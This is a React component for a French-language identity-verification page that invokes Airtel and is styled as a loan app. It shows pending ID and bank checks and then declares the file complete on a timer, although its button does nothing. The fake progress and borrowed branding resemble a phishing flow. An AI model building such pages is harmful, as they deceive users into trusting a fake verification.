import React, { useState, useEffect } from 'react'

function Compliance() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitSuccess, setSubmitSuccess] = useState(false)

  useEffect(() => {
    const timer = setTimeout(() => {
      setSubmitSuccess(true)
    }, 1500)
    return () => clearTimeout(timer)
  }, [])

  return (
    <div className="loan-calculator-container">
      <div className="calculator-header">
        <div style={{ textAlign: 'center', marginBottom: '15px' }}>
          <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '120px' }} />
        </div>
        <h1 className="loan-app-title">
          Confirmation de l'identité{" "}
          <span className="fast-text">en attente...</span>
        </h1>
        <p className="subtitle">Veuillez confirmer vos informations Airtel</p>
      </div>

      <div className="calculator-content">
        <div className="calculator-section">
          <h2 className="section-title">Étapes de vérification</h2>
          
          <div style={{ 
            padding: '20px', 
            background: '#f8f9fa', 
            borderRadius: '12px',
            marginBottom: '20px'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                borderRadius: '50%', 
                background: '#10b981',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#fff',
                fontWeight: 'bold'
              }}>
                ✓
              </div>
              <span style={{ marginLeft: '15px', fontSize: '18px' }}>
                <strong>Nom et coordonnées</strong> - Vérifié
              </span>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                borderRadius: '50%', 
                background: '#f59e0b',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#fff',
                fontWeight: 'bold'
              }}>
                2
              </div>
              <span style={{ marginLeft: '15px', fontSize: '18px' }}>
                <strong>Document d'identité</strong> - En attente
              </span>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                borderRadius: '50%', 
                background: '#e5e7eb',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#fff',
                fontWeight: 'bold'
              }}>
                3
              </div>
              <span style={{ marginLeft: '15px', fontSize: '18px' }}>
                <strong>Vérification bancaire</strong> - En attente
              </span>
            </div>
          </div>

          <button 
            disabled={isSubmitting}
            style={{
              padding: '16px',
              background: isSubmitting ? '#ccc' : 'linear-gradient(135deg, #101e4d, #191d57)',
              color: '#fff',
              border: 'none',
              borderRadius: '12px',
              fontSize: '1rem',
              fontWeight: '700',
              cursor: isSubmitting ? 'not-allowed' : 'pointer',
              width: '100%',
              transition: 'all .2s ease'
            }}
          >
            {isSubmitting ? "Traitement en cours..." : "Confirmer l'identité"}
          </button>

          {submitSuccess && (
            <div style={{
              marginTop: '20px',
              padding: '15px',
              background: '#d1fae5',
              borderRadius: '8px',
              textAlign: 'center'
            }}>
              <strong style={{ color: '#065f46' }}>✓ Votre dossier est maintenant complet!</strong>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

export default Compliance